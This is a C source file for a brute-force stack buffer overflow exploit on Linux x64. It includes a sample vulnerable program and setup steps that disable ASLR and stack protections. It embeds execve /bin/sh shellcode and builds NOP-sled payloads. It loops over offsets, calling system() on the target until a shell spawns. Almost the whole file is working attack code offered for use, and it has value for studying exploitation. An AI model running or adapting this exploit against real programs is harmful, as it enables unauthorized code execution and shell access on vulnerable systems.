/*
	* (Peace be upon you)
	* Brute Force Buffer Overflow Exploit
	* By WhiteWizard
  
	* Architecture Linux/Unix x64 (tested on kali linux x64)
	* This exploit works against programs that take argv[1] and store it into its buffer
	* You can use this exploit by manually specifying the offset or use the value 0 to bruteforce the offset
	* You can test this exploit simply by exploiting below program:

-----------
program.c  |
=======================================================================
#include <stdio.h>

int main(int argc, char *argv[]){
    char buf[300];
    strcpy(buf, argv[1]);
    printf("buffer [:%d : %s :%p : %p]\n", strlen(buf),buf, buf, buf+strlen(buf));
    return 0;
}
=======================================================================
Make sure ASLR is disabled at: /proc/sys/kernel/randomize_va_space
Compile the program using gcc as follow: gcc -z execstack -fno-stack-protector program.c -o program	

Compile the exploit as follow: gcc -z execstack -fno-stack-protector exploit.c -o exploit

1. Run the exploit
2. Specify vulnerable program
3. Set offset to 0 to bruteforce
4. You have a shell :)
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

char shellcode[] ="\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05";
void parseCstring(char othshellcode[], char shellcode[])
{
    int i=0, j=0;
    unsigned char x;
    while ( (x = othshellcode[i]) != '\0')
    {
        if ( (x=='\\') && (othshellcode[i+1]=='x') && (isxdigit(othshellcode[i+2])) && (isxdigit(othshellcode[i+3])) )
        {
            unsigned int val;
            sscanf(&(othshellcode[i+2]),"%2x", &val);
            x=(unsigned char)val;
            i+=3;
        }
        shellcode[j++]=x;
        i++;
    }
}


int main(int argc, char *argv[]){
	unsigned long int i, *ptr, ret, offset=526;
	char *command, *buffer;
	command = (char *) malloc(300024);
	bzero(command, 300024);
	char vulnfile[50]="", off[50]="", cusRet[50]="", othshellcode[500];
	unsigned int offs=0;
	printf("Enter vulnerable program location: ");
	gets(vulnfile);
	sprintf(command, "%s \'", vulnfile);

	printf("Enter the offset of the vulnerable progam or 0 for bruteforce: ");
	gets(off);

	printf("\nDefault Shellocde: \\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x31\\xc0\\x99\\x31\\xf6\\x54\\x5f\\xb0\\x3b\\x0f\\x05\n");
	printf("please specify custom shellcode or press enter for default: ");
	gets(othshellcode);
	if(strlen(othshellcode) > 0){
		shellcode[0]='\0';
		parseCstring(othshellcode, shellcode);
	}
	buffer = command + strlen(command);
	
	
	offs = strtoumax(off, NULL, 10);
	ret = (unsigned long int) &i-offset;
	char *ret_add_p;
	ret_add_p = (char *) malloc(32);
	sprintf(ret_add_p, "%p", ret);
	printf("Please enter return address or press enter for us to find it: ");
	gets(cusRet);
	if(strlen(cusRet)>0){
		ret_add_p[0]='\0';
		sprintf(ret_add_p, "%s", cusRet);
	} else sprintf(ret_add_p, "%p", ret);
	FILE *file = vulnfile;
	if(access(file, F_OK) !=-1){
		printf("\n\n[+] Program %s found successfully\n", vulnfile);
	} else {
		printf("\n\n[-] Program %s not found\n", vulnfile);
		return -1;
	}
	const char *eptr;
	unsigned long long numeric = strtoull(ret_add_p, (char*)&eptr, 16);
	for(i=0; i < 160; i+=4)
		*((unsigned long int *)(buffer+i)) = ret;
	if(offs == 0){
		offs=strlen(shellcode)+6;
		printf("[+] Please wait, we are bruteforcing the offset. As soon as the exploit work, we will spawn you a shell :) \n");
		printf("[+] Spawning shell...\n");
		while(1){
			if(strlen(cusRet)<=0){
				if(offs<150) {
					sprintf(ret_add_p, "0x%llx", numeric+((offs*2)+(offs/2)));
				} else if(offs<300) {
					sprintf(ret_add_p, "0x%llx", numeric+((offs/2)+(offs/4)));
				} else if(offs<400){
					sprintf(ret_add_p, "0x%llx", numeric+(offs/7));
				} else if(offs>500 && offs<1500){
					sprintf(ret_add_p, "0x%llx", numeric-(offs)+(offs/5));
				} else if(offs>1500){
					sprintf(ret_add_p, "0x%llx", numeric-(offs+(offs/2)));
				}
			}
        		char *ret_value = strtoull(ret_add_p, (char*)&eptr, 16);
        		char ret1[32],ret2[32], ret3[32], ret4[32], ret5[32], ret6[32];
        		sprintf(ret1, "%c%c", ret_add_p[2],ret_add_p[3]);
        		sprintf(ret2, "%c%c", ret_add_p[4],ret_add_p[5]);
        		sprintf(ret3, "%c%c", ret_add_p[6],ret_add_p[7]);
        		sprintf(ret4, "%c%c", ret_add_p[8],ret_add_p[9]);
        		sprintf(ret5, "%c%c", ret_add_p[10],ret_add_p[11]);
        		sprintf(ret6, "%c%c", ret_add_p[12],'0');
        		char ret_rev[64];
        		sprintf(ret_rev, "\\x%2s\\x%2s\\x%2s\\x%2s\\x%2s\\x%2s", ret6, ret5, ret4, ret3, ret2, ret1);
        		char con[10] = "";
        		sscanf(ret_rev, "\\x%2hhx\\x%2hhx\\x%2hhx\\x%2hhx\\x%2hhx\\x%2hhx",
        		&con[0], &con[1], &con[2], &con[3],&con[4], &con[5]);
        		for(i=0; i < 160; i+=4)
                		*((unsigned long int *)(buffer+i)) = ret;
			memset(buffer, 0x90, offs);
			if(offs > 150){
				memcpy(buffer+((offs/2)+(offs/4)), shellcode, sizeof(shellcode)-1);
				memcpy(buffer+(offs-6), con, sizeof(con)-1);
			} else {
				memcpy(buffer+(offs/2), shellcode, sizeof(shellcode)-1);
				memcpy(buffer+(offs-6), con, sizeof(con)-1);
			}
			strcat(command, "\' 2>log.txt");
			system(command);
			offs++;
			//if(offs == 100) exit(0);
		}
	}
	if(strlen(cusRet)<=0){

		if(offs<150) {
			sprintf(ret_add_p, "0x%llx", numeric+((offs*2)+(offs/2)));
		} else if(offs<300) {
			sprintf(ret_add_p, "0x%llx", numeric+((offs/2)+(offs/6)));
		} else if(offs<400){
			sprintf(ret_add_p, "0x%llx", numeric+(offs/7));
		} else if(offs>500 && offs<1500){
			sprintf(ret_add_p, "0x%llx", numeric-(offs)+(offs/5));
		} else if(offs>1500){
			sprintf(ret_add_p, "0x%llx", numeric-(offs+(offs/2)));
		}
	}
	char *ret_value = strtoull(ret_add_p, (char*)&eptr, 16);
	char ret1[32],ret2[32], ret3[32], ret4[32], ret5[32], ret6[32];
	sprintf(ret1, "%c%c", ret_add_p[2],ret_add_p[3]);
	sprintf(ret2, "%c%c", ret_add_p[4],ret_add_p[5]);
	sprintf(ret3, "%c%c", ret_add_p[6],ret_add_p[7]);
	sprintf(ret4, "%c%c", ret_add_p[8],ret_add_p[9]);
	sprintf(ret5, "%c%c", ret_add_p[10],ret_add_p[11]);
	sprintf(ret6, "%c%c", ret_add_p[12],'0');
	char ret_rev[64];
	sprintf(ret_rev, "\\x%2s\\x%2s\\x%2s\\x%2s\\x%2s\\x%2s", ret6, ret5, ret4, ret3, ret2, ret1);
	char con[10] = "";
	sscanf(ret_rev, "\\x%2hhx\\x%2hhx\\x%2hhx\\x%2hhx\\x%2hhx\\x%2hhx",
	&con[0], &con[1], &con[2], &con[3],&con[4], &con[5]);
	printf("[+] Using Address: %s\n", ret_add_p);
	printf("[+] Spawning shell...\n");
	memset(buffer, 0x90, offs);
	if(offs > 150){
        	memcpy(buffer+((offs/2)+(offs/4)), shellcode, sizeof(shellcode)-1);
        	memcpy(buffer+(offs-6), con, sizeof(con)-1);
	} else {
		memcpy(buffer+(offs/2), shellcode, sizeof(shellcode)-1);
        	memcpy(buffer+(offs-6), con, sizeof(con)-1);
	}
        strcat(command, "\'");
        system(command);
        free(command);
	return 0;
}
